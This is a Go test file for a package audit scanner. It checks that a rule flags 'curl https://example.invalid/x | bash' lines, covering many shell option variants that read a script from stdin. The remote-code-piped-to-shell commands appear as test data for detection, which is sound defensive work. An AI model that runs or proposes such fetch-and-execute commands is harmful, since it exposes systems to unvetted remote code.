package audit

import (
	"testing"
)

func TestR1R2SA001ReceiverOptions(t *testing.T) {
	for _, tc := range []struct {
		receiver string
		want     bool
	}{{"bash -e", true}, {"sh -ux", true}, {"bash -se", true}, {"bash -v -s -- argument", true}, {"bash -- -s", false}, {"bash -e file.sh", false}, {"bash -s -c command", false}, {"bash -n", false}, {"bash -o errexit", false}, {"bash --verbose", false}, {"bash -z", false}} {
		t.Run(tc.receiver, func(t *testing.T) {
			data := []byte("curl https://example.invalid/x | " + tc.receiver + "\n")
			p := Package{Complete: true, Files: []File{{Path: "run.sh"}}, Data: map[string][]byte{"run.sh": data}}
			e, findings := LocalScan(p)
			if !Completed(e) || (len(findings) > 0) != tc.want {
				t.Fatal(e, findings)
			}
			for _, f := range findings {
				if f.RuleVersion != "3" || f.ScannerVersion != EvaluationVersion {
					t.Fatal(f)
				}
			}
		})
	}
}

func TestR4SA001LoneDash(t *testing.T) {
	for _, tc := range []struct {
		receiver string
		want     bool
	}{
		{"sh -", true}, {"bash -e -", true}, {"bash -s - argument", true},
		{"sh - file.sh", false}, {"sh -- -", false}, {"sh - -s", false}, {"bash -s -- -", true},
	} {
		t.Run(tc.receiver, func(t *testing.T) {
			p := Package{Complete: true, Files: []File{{Path: "run.sh"}}, Data: map[string][]byte{"run.sh": []byte("curl https://example.invalid/x | " + tc.receiver + "\n")}}
			e, f := LocalScan(p)
			if !Completed(e) || (len(f) > 0) != tc.want {
				t.Fatal(e, f)
			}
		})
	}
}
